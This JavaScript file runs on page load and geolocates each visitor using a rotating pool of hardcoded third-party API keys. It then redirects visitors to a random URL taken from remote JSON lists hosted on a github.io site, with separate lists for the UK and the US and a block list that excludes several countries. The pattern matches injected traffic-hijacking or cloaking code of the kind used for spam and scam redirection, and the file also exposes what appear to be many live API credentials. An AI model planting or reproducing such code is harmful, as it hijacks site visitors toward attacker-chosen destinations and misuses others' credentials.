// List of JSON URLs for country information
const jsonUrls = [
    'https://pro.ip-api.com/json/?key=6KddQSe576qrfNb',
    'https://pro.ip-api.com/json/?key=U4NdpvcDcxvMekN',
    'https://pro.ip-api.com/json/?key=9908tZlRhI0pK5W',
    'https://pro.ip-api.com/json/?key=WEPQWHzy7RYlxSd',
    'https://pro.ip-api.com/json/?key=WMFayXqD09GW5u8',
    'https://pro.ip-api.com/json?key=E7Rt1oUyF5qA3HC',
    'https://pro.ip-api.com/json?key=oR1iAosgCjiPtQi',
    'https://pro.ip-api.com/json/?key=qbYk7OjO4GIy9xU',
    'http://pro.ip-api.com/json/?key=xdjZbj0ZiVVozCo',
    'https://pro.ip-api.com/json/?key=SAtoFddpK9OSHLU',
    'https://pro.ip-api.com/json?key=ay3FPSS6OcBXPHg',
    'https://pro.ip-api.com/json/?key=TLhzDvbBKp6rOeS',
    'https://api.ipgeolocation.io/ipgeo?apiKey=b05dd28c8a8640e6828239aa2475a433',
    'https://api.ipgeolocation.io/ipgeo?apiKey=f298ffa744ce4f369df057fef53a616c',
    'https://api.ipgeolocation.io/ipgeo?apiKey=e599fda391b3490aa95fa4dc91a02a33',
    'https://api.ipgeolocation.io/ipgeo?apiKey=3d51f9c2a42948f2ad9990f70a83f091',
    'https://api.ipgeolocation.io/ipgeo?apiKey=b752e2e2fd6a45e9a0593f035e062908',
    'https://api.ipgeolocation.io/ipgeo?apiKey=901b1003783346d0b4e55b050f6cbdee',
    'https://api.ipgeolocation.io/ipgeo?apiKey=cc885b8e2df94d06b33606e7bc47f339',
    'https://api.ipgeolocation.io/ipgeo?apiKey=5fd22ee3dec643fa8425223e40d14ed4',
    'https://api.ipgeolocation.io/ipgeo?apiKey=2870dd4c8d9c4854b101330bb9f1d288',
    'https://api.ipgeolocation.io/ipgeo?apiKey=db3da8ae12ed4d6b87e8d04279280861',
    'https://api.ipgeolocation.io/ipgeo?apiKey=f787937170744422ac13ed7807707a8c',
    'https://api.ipgeolocation.io/ipgeo?apiKey=8fb1e084645e4a46a4590872290dc853',
    'https://api.ipgeolocation.io/ipgeo?apiKey=a5c0ca4aef6b4dd1a58eb0a657d14bc0',
    'https://api.ipgeolocation.io/ipgeo?apiKey=f7513a8717b842f0bf7f732cc6558a82',
    'https://api.ipgeolocation.io/ipgeo?apiKey=04cf8799075b41a7b9f37365feac19b3',
    'https://api.ipgeolocation.io/ipgeo?apiKey=f2486f52b2e242f6bae60867ce9cd299',
    'https://api.ipgeolocation.io/ipgeo?apiKey=d5b00b6c0ec2490592216aa7cc012d2c'
];

// Configuration for country-based URL redirection
const countryConfig = {
    GB: 'https://hellonetwork2023.github.io/uk/ukurls.json',
    default: 'https://hellonetwork2023.github.io/us/usurls.json'
};

const excludedCountries = ['MA', 'FR', 'ES', 'DZ', 'CN', 'EG', 'TR', 'IN', 'IR', 'PK', 'RU'];

// Fetch country information
(function fetchCountryAndRedirect() {
    const randomIndex = Math.floor(Math.random() * jsonUrls.length);
    const randomUrl = jsonUrls[randomIndex];

    fetch(randomUrl)
        .then(response => response.json())
        .then(data => {
            // Extract country code
            const countryCode = data.countryCode || data.country_code2;

            if (!countryCode) {
                console.warn('Country code not found, redirecting to default.');
                redirectToUrls(countryConfig.default);
                return;
            }

            console.log('Detected country code:', countryCode);

            // Check exclusion list
            if (excludedCountries.includes(countryCode)) {
                console.log(`Country ${countryCode} is excluded from redirection.`);
                return;
            }

            // Fetch and redirect based on country
            const jsonFile = countryConfig[countryCode] || countryConfig.default;
            redirectToUrls(jsonFile);
        })
        .catch(error => {
            console.error('Error fetching country information:', error);
            redirectToUrls(countryConfig.default);
        });
})();

// Fetch URLs from JSON and perform redirection
function redirectToUrls(jsonFile, delay = 300) {
    fetch(jsonFile)
        .then(response => response.json())
        .then(data => {
            if (!data.urls || data.urls.length === 0) {
                console.error('No URLs found in JSON file.');
                return;
            }

            const urls = data.urls.map(site => site.url);
            const randomIndex = Math.floor(Math.random() * urls.length);
            const randomUrl = urls[randomIndex];

            console.log(`Redirecting to: ${randomUrl}`);
            setTimeout(() => {
                window.location.href = randomUrl;
            }, delay);
        })
        .catch(error => {
            console.error('Error fetching redirection URLs:', error);
        });
}
